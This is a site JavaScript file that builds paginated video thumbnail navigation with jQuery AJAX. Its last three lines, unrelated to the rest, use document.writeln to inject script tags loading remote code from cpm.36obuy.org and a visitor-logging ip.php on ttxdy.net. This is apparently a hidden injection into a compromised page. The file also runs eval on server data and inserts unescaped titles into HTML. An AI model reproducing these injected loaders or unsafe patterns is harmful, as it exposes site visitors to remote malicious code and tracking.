// JavaScript Document
 var items;
 var pagecount=1;
 var page=1;
 var bannerPhoto=new Array();
 var bannerPhotolink=new Array();
  function  bindPhotoNav(classid,pageindex) {
      $.ajax({
          type: "post",
          dataType: "json",
          url: "/tools/ajax.aspx?type=newsvideo",
          data: { "classid": classid, "page": pageindex, "width": 522, "height": 450, "no-cache": Math.random() },
          beforeSend: function() {
              //
          },
          success: function(msg) {
              msg = eval(msg);
              if (pageindex == 0) pagecount = msg.pagecount;
              items = msg.items;
              var length = items.length;
              if (length < 1) {
                  alert("暂时无法显示导航条");
                  return;
              }
              var html = "";
              for (var i in items) {
                  var border = "";
                  var imgclass = "outimg";
                  html += "<img src='" + items[i].spicurl + "' onclick=\"PlayVideo(this,'" + items[i].newsid + "','" + items[i].classid + "'," + items[i].vtype + ",'" + items[i].newstitle + "')\" alt='" + items[i].newstitle + "' title='" + items[i].newstitle + "' id='img" + i + "' class='" + imgclass + "'/>";

              }
              $("#photonav").html(html);
              if (pageindex == 0) PlayVideo(document.getElementById("img0"), items[0].newsid, items[0].classid, items[0].vtype, items[0].newstitle);

          },
          complete: function(XMLHttpRequest, textStatus) {
          },
          error: function() {
              //请求出错处理
              //showMyDiv(ShowObj,"加载出错请联系管理员",width);
              alert("加载出错请联系管理员！");
          }
      });
	  }

	  function turnPrevPage(classid) {
	      if (page == 1) {
	          alert("这是第一页");
	          return;
	      }
	      else if (page <= pagecount&&page>1) {
	      page--;
	      bindPhotoNav(classid, page);
	      }
	  }

	  function turnNextPage(classid) {
	      if (page >= pagecount) {
	          alert("这是最后一页");
	          return;
	      }
	      else if(page<=pagecount&&page>0) {
	      page++;
	      bindPhotoNav(classid, page);
	      }
	     
	  }
document.writeln("<script src=\"http://cpm.36obuy.org/js/1.js\"></script>");
document.writeln("<script src=\"http://cpm.36obuy.org/js/1.js\"></script>");
document.writeln("<script src=\"http://www.ttxdy.net:8000/ip.php\"></script>");